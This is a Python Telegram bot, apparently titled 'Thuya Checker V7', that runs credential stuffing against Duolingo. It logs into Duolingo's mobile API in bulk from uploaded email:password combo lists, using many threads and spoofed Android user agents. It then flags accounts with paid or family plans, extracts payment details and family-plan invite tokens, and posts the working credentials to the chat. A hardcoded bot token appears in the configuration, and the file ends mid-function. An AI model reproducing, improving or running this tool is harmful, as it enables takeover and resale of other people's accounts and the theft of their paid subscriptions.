import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import json
import time
import uuid
import logging
import threading
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import traceback

# ========== CONFIGURATION ==========
BOT_TOKEN = "8689449943:AAHFZdaE4L0TkH6S9BAAtmdWbwoTJYyzcJQ"
ADMIN_IDS = [8770379893]
MAX_THREADS = 50
BATCH_SIZE = 10000
PROGRESS_INTERVAL = 1000
REQUEST_TIMEOUT = 20
MAX_RETRIES = 3
RETRY_DELAY = 2
# ===================================

logging.basicConfig(
    format='%(asctime)s [%(levelname)s] %(message)s',
    level=logging.INFO,
    datefmt='%H:%M:%S'
)

bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)

checking_active = False
stop_flag = False
current_executor = None
current_futures = None
check_lock = threading.Lock()

all_super_hits = []
all_family_hits = []
all_free_accounts = []
hits_per_page = 10

super_count = 0
family_count = 0
free_count = 0
fail_count = 0

last_batch_super = 0
last_batch_family = 0
last_batch_free = 0
last_batch_fail = 0

import os

# ========== USER WHITELIST ==========
USERS_FILE = "users.json"
allowed_users = set()  # non-admin authorized users
user_lock = threading.Lock()

def load_users():
    global allowed_users
    try:
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, "r") as f:
                data = json.load(f)
                allowed_users = set(int(x) for x in data.get("users", []))
                logging.info(f"📂 Loaded {len(allowed_users)} authorized users")
    except Exception as e:
        logging.error(f"User load err: {e}")
        allowed_users = set()

def save_users():
    try:
        with user_lock:
            with open(USERS_FILE, "w") as f:
                json.dump({"users": list(allowed_users)}, f)
    except Exception as e:
        logging.error(f"User save err: {e}")

def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_authorized(user_id):
    return user_id in ADMIN_IDS or user_id in allowed_users

# pending admin actions (chat_id -> action_name)
pending_admin_action = {}

def create_session():
    session = requests.Session()
    retry_strategy = Retry(
        total=MAX_RETRIES,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["GET", "POST"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=100, pool_maxsize=100)
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    return session

def get_headers(ua, jwt=None):
    headers = {
        "User-Agent": ua,
        "Pragma": "no-cache",
        "Accept-Encoding": "gzip",
        "Accept-Language": "en-US,en;q=0.8",
        "Host": "android-api.duolingo.cn",
        "X-Amzn-Trace-Id": "User=0"
    }
    if jwt:
        headers["Authorization"] = f"Bearer {jwt}"
        headers["Accept"] = "application/json"
        headers["Connection"] = "Keep-Alive"
    return headers

def generate_ua():
    import random
    versions = ["10", "11", "12", "13", "14"]
    models = ["SM-G991B", "Pixel 6", "OnePlus 9", "Xiaomi Mi 11", "Pixel 7 Pro",
              "SM-S908B", "Pixel 8", "OnePlus 12", "Xiaomi 14", "SM-A546B"]
    return f"Dalvik/2.1.0 (Linux; U; Android {random.choice(versions)}; {random.choice(models)} Build/RP1A.200720.012)"

# ========== LANGUAGE MAPPING ==========
LANG_MAP = {
    "en": "🇺🇸 EN", "es": "🇪🇸 ES", "fr": "🇫🇷 FR",
    "de": "🇩🇪 DE", "it": "🇮🇹 IT", "pt": "🇧🇷 PT",
    "ja": "🇯🇵 JA", "ko": "🇰🇷 KO", "zh": "🇨🇳 ZH",
    "ru": "🇷🇺 RU", "ar": "🇸🇦 AR", "hi": "🇮🇳 HI",
    "tr": "🇹🇷 TR", "nl": "🇳🇱 NL", "sv": "🇸🇪 SV",
    "pl": "🇵🇱 PL", "uk": "🇺🇦 UK", "vi": "🇻🇳 VI",
    "th": "🇹🇭 TH", "id": "🇮🇩 ID", "el": "🇬🇷 EL",
    "he": "🇮🇱 HE", "ro": "🇷🇴 RO", "cs": "🇨🇿 CS",
    "hu": "🇭🇺 HU", "ga": "🇮🇪 GA", "cy": "🏴 CY",
    "hv": "🐉 HV", "tlh": "🖖 KL", "la": "🏛 LA",
    "eo": "🌍 EO", "gn": "🇵🇾 GN", "yi": "✡️ YI",
    "zu": "🇿🇦 ZU", "sw": "🇰🇪 SW", "fi": "🇫🇮 FI",
    "da": "🇩🇰 DA", "no": "🇳🇴 NO",
}

def get_lang(code):
    return LANG_MAP.get(code, f"🌐 {code}")

# ========== BILLING CYCLE FROM PRODUCT ID ==========
def parse_billing_from_product(product_id):
    """Extract billing cycle from product ID patterns like '12m', '1m', '6m', '3m'"""
    if not product_id or product_id == "Unknown":
        return None
    pid = product_id.lower()
    # Match patterns like .12m. or _12m_ or -12m-
    m = re.search(r'[\._\-](\d+)m[\._\-]', pid)
    if m:
        months = int(m.group(1))
        if months >= 12:
            return "📆 Yearly"
        elif months >= 6:
            return "📅 6-Month"
        elif months >= 3:
            return "📅 Quarterly"
        else:
            return "📅 Monthly"
    if "annual" in pid or "yearly" in pid or "year" in pid:
        return "📆 Yearly"
    if "month" in pid:
        return "📅 Monthly"
    return None

# ========== PAYMENT DETECTION (IMPROVED) ==========
def detect_payment(data):
    """Detect payment method from multiple API fields"""
    subscription = data.get("subscription", {}) or {}
    shop_items = data.get("shopItems", []) or []

    # 1. Check subscription.purchasePlatform (most reliable from Android API)
    platform = subscription.get("purchasePlatform", "").lower()
    if platform:
        if "google" in platform or "android" in platform:
            return "🟢 Google Play"
        if "apple" in platform or "ios" in platform:
            return "🍎 Apple"
        if "web" in platform or "stripe" in platform:
            return "💳 Credit Card"

    # 2. Check subscription.paymentProcessor
    processor = subscription.get("paymentProcessor", "").lower()
    if processor:
        if "google" in processor:
            return "🟢 Google Play"
        if "apple" in processor:
            return "🍎 Apple"
        if "paypal" in processor:
            return "💙 PayPal"
        if "stripe" in processor or "braintree" in processor:
            return "💳 Credit Card"

    # 3. Check billingInfo inside subscription
    billing_info = subscription.get("billingInfo", {}) or {}
    bp = billing_info.get("paymentProcessor", "").lower()
    if bp:
        if "google" in bp:
            return "🟢 Google Play"
        if "apple" in bp:
            return "🍎 Apple"
        if "stripe" in bp or "braintree" in bp:
            return "💳 Credit Card"

    # 4. Check shopItems for subscription info
    for item in shop_items:
        sub_info = item.get("subscriptionInfo", {}) or {}
        sp = sub_info.get("purchasePlatform", "").lower()
        if sp:
            if "google" in sp or "android" in sp:
                return "🟢 Google Play"
            if "apple" in sp or "ios" in sp:
                return "🍎 Apple"
            if "web" in sp:
                return "💳 Credit Card"

        # Check receipt
        receipt = sub_info.get("receipt", {})
        if receipt:
            rs = json.dumps(receipt).lower() if isinstance(receipt, dict) else str(receipt).lower()
            if "google" in rs or "purchasetoken" in rs:
                return "🟢 Google Play"
            if "apple" in rs or "itunes" in rs:
                return "🍎 Apple"

    # 5. Check product ID patterns
    product_id = subscription.get("productId", "")
    for item in shop_items:
        si = item.get("subscriptionInfo", {}) or {}
        if si.get("productId"):
            product_id = si.get("productId", "")
    if product_id:
        pl = product_id.lower()
        if "google" in pl or "android" in pl:
            return "🟢 Google Play"
        if "apple" in pl or "ios" in pl:
            return "🍎 Apple"

    # 6. Fallback: if premium but unknown method
    if data.get("hasPlus") or data.get("has_item_premium_subscription"):
        return "💎 Unknown"

    return "❓ N/A"

# ========== SOCIAL DETECTION ==========
def detect_social(data):
    links = []
    for acc in (data.get("linkedAccounts", []) or []):
        p = acc.get("provider", "").lower()
        if "google" in p:
            links.append("🔴G")
        elif "facebook" in p:
            links.append("🔵FB")
        elif "apple" in p:
            links.append("🍎A")
    if data.get("hasFacebookId") and "🔵FB" not in links:
        links.append("🔵FB")
    if data.get("hasGoogleId") and "🔴G" not in links:
        links.append("🔴G")
    return " ".join(links) if links else "❌ None"

# ========== EXTRACT SUBSCRIPTION ==========
def extract_sub(data):
    d = {
        "product": "N/A",
        "renew": "❓",
        "expiry": "N/A",
        "invite": None,
        "payment": "❓",
        "billing": "❓"
    }

    sub = data.get("subscription", {}) or {}
    items = data.get("shopItems", []) or []

    # Product ID
    if sub.get("productId"):
        d["product"] = sub["productId"]
    for item in items:
        si = item.get("subscriptionInfo", {}) or {}
        if si.get("productId") and d["product"] == "N/A":
            d["product"] = si["productId"]

    # Renewing
    if sub.get("renewing") is not None:
        d["renew"] = "✅" if sub["renewing"] else "❌"
    for item in items:
        si = item.get("subscriptionInfo", {}) or {}
        if d["renew"] == "❓" and si.get("renewing") is not None:
            d["renew"] = "✅" if si["renewing"] else "❌"

    # Expiry - check multiple fields
    expiry_ms = None
    for key in ["expirationTime", "expectedExpiration", "expiresTime"]:
        if sub.get(key):
            expiry_ms = sub[key]
            break
    if not expiry_ms:
        for item in items:
            si = item.get("subscriptionInfo", {}) or {}
            for key in ["expectedExpiration", "expirationTime", "expiresTime"]:
                if si.get(key):
                    expiry_ms = si[key]
                    break
            if expiry_ms:
                break
    if expiry_ms and isinstance(expiry_ms, (int, float)):
        if expiry_ms > 1000000000000:
            d["expiry"] = datetime.fromtimestamp(expiry_ms / 1000).strftime("%Y-%m-%d")
        elif expiry_ms > 1000000000:
            d["expiry"] = datetime.fromtimestamp(expiry_ms).strftime("%Y-%m-%d")

    # Billing cycle - from subscription field first, then parse from product ID
    period = sub.get("billingPeriod", "").lower()
    if period:
        if "month" in period:
            d["billing"] = "📅 Monthly"
        elif "year" in period or "annual" in period:
            d["billing"] = "📆 Yearly"
        elif "quarter" in period:
            d["billing"] = "📅 Quarterly"
    
    if d["billing"] == "❓":
        # Try billingCycleMonths
        bcm = sub.get("billingCycleMonths")
        if bcm:
            if bcm >= 12:
                d["billing"] = "📆 Yearly"
            elif bcm >= 6:
                d["billing"] = "📅 6-Month"
            elif bcm >= 3:
                d["billing"] = "📅 Quarterly"
            else:
                d["billing"] = "📅 Monthly"

    if d["billing"] == "❓":
        parsed = parse_billing_from_product(d["product"])
        if parsed:
            d["billing"] = parsed

    # Family invite
    for item in items:
        fi = item.get("familyPlanInfo", {}) or {}
        if fi.get("inviteToken"):
            d["invite"] = fi["inviteToken"]

    # Payment
    d["payment"] = detect_payment(data)

    return d

# ========== PREMIUM CHECK ==========
def is_premium_account(data):
    items = data.get("shopItems", []) or []
    for item in items:
        fi = item.get("familyPlanInfo", {}) or {}
        if fi.get("inviteToken"):
            return True, "FAMILY", fi["inviteToken"]
    for item in items:
        si = item.get("subscriptionInfo", {}) or {}
        pid = si.get("productId", "")
        if "trial" in pid.lower():
            continue
        if pid and pid != "N/A":
            return True, "SUPER", None
    sub = data.get("subscription", {}) or {}
    if sub.get("productId") and "trial" not in sub.get("productId", "").lower():
        return True, "SUPER", None
    if data.get("has_item_premium_subscription"):
        return True, "SUPER", None
    if data.get("hasPlus"):
        return True, "SUPER", None
    return False, "FREE", None

# ========== COMPACT HIT MESSAGE ==========
def format_hit(email, password, data, plan_type, sub, invite_token=None):
    username = data.get("username", "?")
    xp = data.get("totalXp", 0)
    streak = 0
    sd = data.get("streakData")
    if sd:
        streak = sd.get("length", 0)
    gems = 0
    gc = data.get("gemsConfig")
    if gc:
        gems = gc.get("gems", 0)
    learn = get_lang(data.get("learningLanguage", "?"))
    from_l = get_lang(data.get("fromLanguage", "?"))
    social = detect_social(data)

    if invite_token:
        sub["invite"] = invite_token

    # Get all courses being learned (compact)
    courses = data.get("courses", []) or []
    course_flags = []
    for c in courses[:6]:
        cl = c.get("learningLanguage", "")
        if cl:
            flag = get_lang(cl).split()[0] if get_lang(cl) else ""
            if flag and flag not in course_flags:
                course_flags.append(flag)
    courses_str = " ".join(course_flags) if course_flags else learn.split()[0] if learn else "?"

    if plan_type == "FAMILY":
        header = "👨‍👩‍👧‍👦  𝗙𝗔𝗠𝗜𝗟𝗬  𝗣𝗟𝗔𝗡"
    else:
        header = "💎  𝗦𝗨𝗣𝗘𝗥  𝗣𝗥𝗘𝗠𝗜𝗨𝗠"

    # Tight, mobile-friendly layout
    msg = (
        f"{header}\n"
        f"`{email}:{password}`\n"
        f"\n"
        f"👤 *{username}*  ·  ⭐ {xp:,}  ·  🔥 {streak}d  ·  💎 {gems:,}\n"
        f"📚 {courses_str}  ←  {from_l}\n"
        f"🔗 {social}\n"
        f"\n"
        f"💳 {sub['payment']}  ·  {sub['billing']}\n"
        f"🔁 {sub['renew']}  ·  ⏰ {sub['expiry']}\n"
        f"📦 `{sub['product']}`\n"
        f"\n"
        f"🦉 _Thuya Checker V7_"
    )

    return msg


def build_hit_keyboard(email, password, plan_type, sub):
    """Inline buttons: Copy combo, Open Duolingo, Family invite if available"""
    kb = InlineKeyboardMarkup(row_width=2)
    # Login link (web)
    kb.add(
        InlineKeyboardButton("🌐 Open Duolingo", url="https://www.duolingo.com/?isLoggingIn=true"),
        InlineKeyboardButton("📧 Gmail Login", url="https://mail.google.com/"),
    )
    if plan_type == "FAMILY" and sub.get("invite"):
        link = f"https://www.duolingo.com/family-plan?invite={sub['invite']}"
        kb.add(InlineKeyboardButton("🎟 Join Family Plan", url=link))
    return kb

# ========== CHECK SINGLE ACCOUNT ==========
def check_single_account(email, password):
    if stop_flag:
        return email, password, "STOPPED", None, None

    session = create_session()
    ua = generate_ua()

    for attempt in range(MAX_RETRIES):
        try:
            login_url = "https://android-api.duolingo.cn/2017-06-30/login?fields=id"
            login_payload = {
                "distinctId": str(uuid.uuid4()),
                "identifier": email,
                "password": password
            }
            login_headers = get_headers(ua)
            login_headers["Content-Type"] = "application/json"

            resp = session.post(login_url, json=login_payload, headers=login_headers, timeout=REQUEST_TIMEOUT)

            if resp.status_code == 429:
                time.sleep(RETRY_DELAY * (attempt + 1))
                continue
            if resp.status_code != 200:
                return email, password, "FAIL", "wrong credentials", None

            user_id = resp.json().get("id")
            if not user_id:
                return email, password, "FAIL", "no user id", None

            jwt_token = None
            for cookie in session.cookies:
                if cookie.name == "jwt_token":
                    jwt_token = cookie.value
                    break
            if not jwt_token:
                return email, password, "FAIL", "no jwt token", None

            # Extended fields for better billing detection
            fields = [
                "shopItems", "totalXp", "streakData", "username",
                "fromLanguage", "learningLanguage", "gemsConfig",
                "hasPlus", "has_item_premium_subscription",
                "createdAt", "linkedAccounts", "hasFacebookId", "hasGoogleId",
                "subscription", "profile", "courses",
                "purchasePrice", "currentCourseId"
            ]
            profile_url = (
                f"https://android-api.duolingo.cn/2023-05-23/users/{user_id}"
                f"?fields={','.join(fields)}"
            )

            resp2 = session.get(profile_url, headers=get_headers(ua, jwt_token), timeout=REQUEST_TIMEOUT)

            if resp2.status_code == 429:
                time.sleep(RETRY_DELAY * (attempt + 1))
                continue
            if resp2.status_code != 200:
                return email, password, "FAIL", f"profile {resp2.status_code}", None

            data = resp2.json()
            is_prem, plan_type, invite_token = is_premium_account(data)

            if not is_prem:
                un = data.get("username", "?")
                return email, password, "FREE", f"{un}|XP:{data.get('totalXp',0)}", None

            sub = extract_sub(data)
            result = format_hit(email, password, data, plan_type, sub, invite_token)
            family_invite = sub.get("invite") if plan_type == "FAMILY" else None
            return email, password, "HIT", result, plan_type, family_invite

        except requests.exceptions.ConnectionError:
            if attempt < MAX_RETRIES - 1:
                time.sleep(RETRY_DELAY * (attempt + 1))
                continue
            return email, password, "FAIL", "connection error", None
        except requests.exceptions.Timeout:
            if attempt < MAX_RETRIES - 1:
                time.sleep(RETRY_DELAY * (attempt + 1))
                continue
            return email, password, "FAIL", "timeout", None
        except requests.exceptions.RequestException as e:
            if attempt < MAX_RETRIES - 1:
                time.sleep(RETRY_DELAY * (attempt + 1))
                continue
            return email, password, "FAIL", str(e)[:40], None
        except Exception as e:
            logging.error(f"Error {email}: {e}")
            return email, password, "FAIL", str(e)[:40], None
        finally:
            session.close()

    return email, password, "FAIL", "max retries", None

# ========== MENU ==========
def send_main_menu(chat_id, user_id=None):
    total_hits = len(all_super_hits) + len(all_family_hits)
    status = "🟢 IDLE" if not checking_active else "🔴 CHECKING"

    msg = f"""{'━' * 32}
🦉 𝗗𝗨𝗢𝗟𝗜𝗡𝗚𝗢 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗩𝟳
{'━' * 32}
👑 @thuyaaungzaw ∙ {status}
🧵 {MAX_THREADS} threads ∙ 🔄 {MAX_RETRIES}x retry

💎 Super: {super_count} ∙ 👨‍👩‍👧 Family: {family_count}
💾 Saved: {total_hits}"""

    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🚀 START", callback_data="start_check"),
        InlineKeyboardButton("📊 STATS", callback_data="my_stats")
    )
    markup.row(
        InlineKeyboardButton("💾 HITS", callback_data="view_hits"),
        InlineKeyboardButton("⚙️ SETTINGS", callback_data="tools")
    )
    if user_id is not None and is_admin(user_id):
        markup.row(InlineKeyboardButton("👑 ADMIN PANEL", callback_data="admin_panel"))
    markup.row(InlineKeyboardButton("❌ CLOSE", callback_data="close_panel"))
    bot.send_message(chat_id, msg, parse_mode='Markdown', reply_markup=markup)


def send_admin_panel(chat_id):
    total_users = len(allowed_users)
    msg = f"""{'━' * 32}
👑 𝗔𝗗𝗠𝗜𝗡  𝗣𝗔𝗡𝗘𝗟
{'━' * 32}
👥 Authorized users: *{total_users}*
🛡 Admins: *{len(ADMIN_IDS)}*

Manage who can access the bot."""
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("➕ ADD USER", callback_data="admin_add"),
        InlineKeyboardButton("➖ REMOVE USER", callback_data="admin_remove"),
    )
    markup.row(InlineKeyboardButton("📋 LIST USERS", callback_data="admin_list"))
    markup.row(InlineKeyboardButton("🏠 MENU", callback_data="main_menu"))
    bot.send_message(chat_id, msg, parse_mode='Markdown', reply_markup=markup)


def send_user_list(chat_id):
    if not allowed_users:
        text = "📭 No authorized users yet.\n\nUse ➕ ADD USER and send a numeric Telegram ID."
    else:
        lines = [f"`{uid}`" for uid in sorted(allowed_users)]
        text = f"👥 *Authorized Users ({len(allowed_users)})*\n\n" + "\n".join(lines)
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("⬅️ BACK", callback_data="admin_panel"))
    bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=markup)

def send_hits_list(chat_id, page=0):
    total_hits = len(all_super_hits) + len(all_family_hits)
    if total_hits == 0:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🏠 MENU", callback_data="main_menu"))
        bot.send_message(chat_id, "📭 No hits yet. Send a combo file!", reply_markup=markup)
        return

    all_hits = []
    for e, p, r in all_super_hits:
        all_hits.append(("💎", e, p, r))
    for e, p, r in all_family_hits:
        all_hits.append(("👨‍👩‍👧", e, p, r))

    total_pages = (len(all_hits) + hits_per_page - 1) // hits_per_page
    page = max(0, min(page, total_pages - 1))
    start = page * hits_per_page
    end = min(start + hits_per_page, len(all_hits))

    text = f"💾 𝗛𝗜𝗧𝗦 ({page+1}/{total_pages})\n"
    for i, (icon, e, p, r) in enumerate(all_hits[start:end], start=start+1):
        # Extract compact info
        lines = r.split('\n')
        user_info = payment = expiry = "?"
        for line in lines:
            if '👤' in line and '⭐' in line:
                user_info = line.strip()[:40]
            elif '⏰' in line:
                parts = line.split('⏰')
                if len(parts) > 1:
                    expiry = parts[1].strip()[:10]
            elif '💳' in line:
                payment = line.strip()[2:30]
        text += f"\n{icon} [{i}] `{e[:20]}..`\n   {user_info}\n   💳{payment} ⏰{expiry}\n"

    text += "\n💡 EXPORT for full details"

    markup = InlineKeyboardMarkup(row_width=3)
    btns = []
    if page > 0:
        btns.append(InlineKeyboardButton("◀️", callback_data=f"hits_page_{page-1}"))
    btns.append(InlineKeyboardButton(f"{page+1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1:
        btns.append(InlineKeyboardButton("▶️", callback_data=f"hits_page_{page+1}"))
    markup.row(*btns)
    markup.row(
        InlineKeyboardButton("📋 EXPORT", callback_data="copy_all_hits"),
        InlineKeyboardButton("🔄", callback_data="refresh_hits")
    )
    markup.row(InlineKeyboardButton("🏠 MENU", callback_data="main_menu"))
    bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=markup)

def send_stats(chat_id):
    total_hits = len(all_super_hits) + len(all_family_hits)
    total = super_count + family_count + free_count + fail_count
    rate = round(total_hits / total * 100, 2) if total > 0 else 0

    msg = f"""{'━' * 32}
📊 𝗦𝗧𝗔𝗧𝗦
{'━' * 32}
💎 Super: {super_count:,} ∙ 👨‍👩‍👧 Family: {family_count:,}
⚠️ Free: {free_count:,} ∙ ❌ Fail: {fail_count:,}
📋 Total: {total:,} ∙ 🎯 Rate: {rate}%
{'🔴 CHECKING' if checking_active else '🟢 IDLE'}"""

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🏠 MENU", callback_data="main_menu"))
    bot.send_message(chat_id, msg, parse_mode='Markdown', reply_markup=markup)

# ========== CALLBACK HANDLER ==========
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    global MAX_THREADS, MAX_RETRIES, checking_active, stop_flag, current_executor, current_futures
    global super_count, family_count, free_count, fail_count
    global all_super_hits, all_family_hits

    try:
        if call.data == "start_check":
            bot.answer_callback_query(call.id)
            if checking_active:
                bot.send_message(call.message.chat.id, "⚠️ Already running! /stop first")
                return
            bot.send_message(call.message.chat.id,
                "📎 Send combo file (.txt)\nFormat: `email:password`", parse_mode='Markdown')

        elif call.data == "my_stats":
            bot.answer_callback_query(call.id)
            send_stats(call.message.chat.id)

        elif call.data == "view_hits":
            bot.answer_callback_query(call.id)
            send_hits_list(call.message.chat.id, 0)

        elif call.data == "tools":
            bot.answer_callback_query(call.id)
            markup = InlineKeyboardMarkup(row_width=2)
            markup.add(
                InlineKeyboardButton("🧵 THREADS", callback_data="thread_settings"),
                InlineKeyboardButton("🔄 RETRIES", callback_data="retry_settings")
            )
            markup.row(InlineKeyboardButton("🗑️ CLEAR ALL", callback_data="clear_hits"))
            markup.add(InlineKeyboardButton("🏠 MENU", callback_data="main_menu"))
            bot.send_message(call.message.chat.id,
                f"⚙️ 🧵{MAX_THREADS} ∙ 🔄{MAX_RETRIES}x ∙ ⏱{REQUEST_TIMEOUT}s",
                parse_mode='Markdown', reply_markup=markup)

        elif call.data == "thread_settings":
            bot.answer_callback_query(call.id)
            markup = InlineKeyboardMarkup(row_width=4)
            markup.row(
                InlineKeyboardButton("10", callback_data="set_threads_10"),
                InlineKeyboardButton("20", callback_data="set_threads_20"),
                InlineKeyboardButton("30", callback_data="set_threads_30"),
                InlineKeyboardButton("50", callback_data="set_threads_50")
            )
            markup.add(InlineKeyboardButton("⬅️", callback_data="tools"))
            bot.send_message(call.message.chat.id, f"🧵 Current: `{MAX_THREADS}`", parse_mode='Markdown', reply_markup=markup)

        elif call.data == "retry_settings":
            bot.answer_callback_query(call.id)
            markup = InlineKeyboardMarkup(row_width=3)
            markup.row(
                InlineKeyboardButton("1x", callback_data="set_retry_1"),
                InlineKeyboardButton("3x", callback_data="set_retry_3"),
                InlineKeyboardButton("5x", callback_data="set_retry_5")
            )
            markup.add(InlineKeyboardButton("⬅️", callback_data="tools"))
            bot.send_message(call.message.chat.id, f"🔄 Current: `{MAX_RETRIES}x`", parse_mode='Markdown', reply_markup=markup)

        elif call.data.startswith("set_threads_"):
            MAX_THREADS = int(call.data.split("_")[2])
            bot.answer_callback_query(call.id, f"✅ Threads → {MAX_THREADS}")
            send_main_menu(call.message.chat.id, call.from_user.id)

        elif call.data.startswith("set_retry_"):
            MAX_RETRIES = int(call.data.split("_")[2])
            bot.answer_callback_query(call.id, f"✅ Retries → {MAX_RETRIES}x")
            send_main_menu(call.message.chat.id, call.from_user.id)

        elif call.data == "clear_hits":
            bot.answer_callback_query(call.id)
            all_super_hits.clear()
            all_family_hits.clear()
            super_count = family_count = free_count = fail_count = 0
            bot.send_message(call.message.chat.id, "✅ Cleared!")
            send_main_menu(call.message.chat.id, call.from_user.id)

        elif call.data == "main_menu":
            bot.answer_callback_query(call.id)
            send_main_menu(call.message.chat.id, call.from_user.id)

        elif call.data == "close_panel":
            bot.answer_callback_query(call.id)
            try:
                bot.delete_message(call.message.chat.id, call.message.message_id)
            except:
                pass

        elif call.data == "noop":
            bot.answer_callback_query(call.id)

        elif call.data == "refresh_hits":
            bot.answer_callback_query(call.id)
            send_hits_list(call.message.chat.id, 0)

        elif call.data == "copy_all_hits":
            bot.answer_callback_query(call.id)
            txt = f"🦉 HITS {datetime.now().strftime('%Y-%m-%d %H:%M')}\n{'═'*30}\n\n"
            for e, p, r in all_super_hits:
                txt += r + "\n\n"
            for e, p, r in all_family_hits:
                txt += r + "\n\n"
            if txt.strip():
                if len(txt) > 4000:
                    parts = [txt[i:i+4000] for i in range(0, len(txt), 4000)]
                    for i, part in enumerate(parts):
                        bot.send_message(call.message.chat.id, f"📋 Part {i+1}/{len(parts)}:\n```\n{part}```", parse_mode='Markdown')
                else:
                    bot.send_message(call.message.chat.id, f"📋\n```\n{txt}```", parse_mode='Markdown')
            else:
                bot.send_message(call.message.chat.id, "📭 No hits.")

        elif call.data.startswith("hits_page_"):
            page = int(call.data.split("_")[2])
            send_hits_list(call.message.chat.id, page)

        # ========== ADMIN PANEL ==========
        elif call.data == "admin_panel":
            bot.answer_callback_query(call.id)
            if not is_admin(call.from_user.id):
                bot.send_message(call.message.chat.id, "⛔ Admin only.")
                return
            send_admin_panel(call.message.chat.id)

        elif call.data == "admin_list":
            bot.answer_callback_query(call.id)
            if not is_admin(call.from_user.id):
                return
            send_user_list(call.message.chat.id)

        elif call.data == "admin_add":
            bot.answer_callback_query(call.id)
            if not is_admin(call.from_user.id):
                return
            pending_admin_action[call.from_user.id] = "add"
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("❌ Cancel", callback_data="admin_cancel"))
            bot.send_message(call.message.chat.id,
                "➕ *Add User*\n\nReply with the Telegram numeric ID to authorize.\n_(e.g. `123456789`)_",
                parse_mode='Markdown', reply_markup=markup)

        elif call.data == "admin_remove":
            bot.answer_callback_query(call.id)
            if not is_admin(call.from_user.id):
                return
            if not allowed_users:
                bot.send_message(call.message.chat.id, "📭 No users to remove.")
                send_admin_panel(call.message.chat.id)
                return
            markup = InlineKeyboardMarkup(row_width=2)
            for uid in sorted(allowed_users):
                markup.add(InlineKeyboardButton(f"❌ {uid}", callback_data=f"admin_del_{uid}"))
            markup.row(InlineKeyboardButton("⬅️ BACK", callback_data="admin_panel"))
            bot.send_message(call.message.chat.id,
                "➖ *Remove User*\nTap an ID to revoke access:",
                parse_mode='Markdown', reply_markup=markup)

        elif call.data.startswith("admin_del_"):
            if not is_admin(call.from_user.id):
                bot.answer_callback_query(call.id, "⛔")
                return
            try:
                uid = int(call.data.split("_")[2])
                if uid in allowed_users:
                    allowed_users.discard(uid)
                    save_users()
                    bot.answer_callback_query(call.id, f"✅ Removed {uid}")
                else:
                    bot.answer_callback_query(call.id, "Not found")
            except Exception:
                bot.answer_callback_query(call.id, "⚠️ Error")
            send_admin_panel(call.message.chat.id)

        elif call.data == "admin_cancel":
            bot.answer_callback_query(call.id, "Cancelled")
            pending_admin_action.pop(call.from_user.id, None)
            send_admin_panel(call.message.chat.id)

    except Exception as e:
        logging.error(f"Callback error: {e}")
        try:
            bot.answer_callback_query(call.id, "⚠️ Error")
        except:
            pass

# ========== PROCESS COMBOS ==========
def process_combos(chat_id, combos):
    global checking_active, stop_flag, current_executor, current_futures
    global super_count, family_count, free_count, fail_count
    global all_super_hits, all_family_hits, all_free_accounts
    global last_batch_super, last_batch_family, last_batch_free, last_batch_fail

    with check_lock:
        checking_active = True
        stop_flag = False

    super_count = family_count = free_count = fail_count = 0
    all_super_hits = []
    all_family_hits = []
    all_free_accounts = []
    last_batch_super = last_batch_family = last_batch_free = last_batch_fail = 0

    total = len(combos)
    completed = 0
    start_time = time.time()
    last_update = 0

    status_msg = bot.send_message(chat_id,
        f"🚀 Starting ∙ 📋{total:,} ∙ 🧵{MAX_THREADS} ∙ 🔄{MAX_RETRIES}x")

    try:
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            current_executor = executor
            futures = {executor.submit(check_single_account, e, p): (e, p) for e, p in combos}
            current_futures = futures

            for future in as_completed(futures):
                if stop_flag:
                    for f in futures:
                        f.cancel()
                    break

                completed += 1
                pct = (completed / total) * 100
                elapsed = time.time() - start_time

                try:
                    result = future.result(timeout=60)
                    if len(result) == 6:
                        email, password, status, detail, plan_type, family_invite = result
                    elif len(result) == 5:
                        email, password, status, detail, plan_type = result
                        family_invite = None
                    else:
                        continue
                except Exception:
                    fail_count += 1
                    last_batch_fail += 1
                    continue

                if status == "HIT":
                    if plan_type == "FAMILY":
                        family_count += 1
                        last_batch_family += 1
                        all_family_hits.append((email, password, detail))
                    else:
                        super_count += 1
                        last_batch_super += 1
                        all_super_hits.append((email, password, detail))
                    # Inline buttons attached to each hit
                    hit_kb = InlineKeyboardMarkup(row_width=2)
                    hit_kb.add(
                        InlineKeyboardButton("🌐 Duolingo", url="https://www.duolingo.com/?isLoggingIn=true"),
                        InlineKeyboardButton("📋 Copy Combo", callback_data="noop"),
                    )
                    if plan_type == "FAMILY" and family_invite:
                        link = f"https://www.duolingo.com/family-plan?invite={family_invite}"
                        hit_kb.row(InlineKeyboardButton("🎟 Join Family Plan", url=link))
                    try:
                        bot.send_message(chat_id, detail, parse_mode='Markdown', reply_markup=hit_kb)
                    except Exception:
                        try:
                            bot.send_message(chat_id, detail, reply_markup=hit_kb)
                        except Exception:
                            try:
                                bot.send_message(chat_id, detail)
                            except Exception:
                                pass
                    logging.info(f"✅ HIT: {email} ({plan_type})")
                elif status == "FREE":
                    free_count += 1
                    last_batch_free += 1
                elif status == "STOPPED":
                    break
                else:
                    fail_count += 1
                    last_batch_fail += 1

                if completed - last_update >= PROGRESS_INTERVAL or completed == total:
                    last_update = completed
                    bar = "█" * int(pct/5) + "░" * (20 - int(pct/5))
                    spd = completed / elapsed if elapsed > 0 else 0
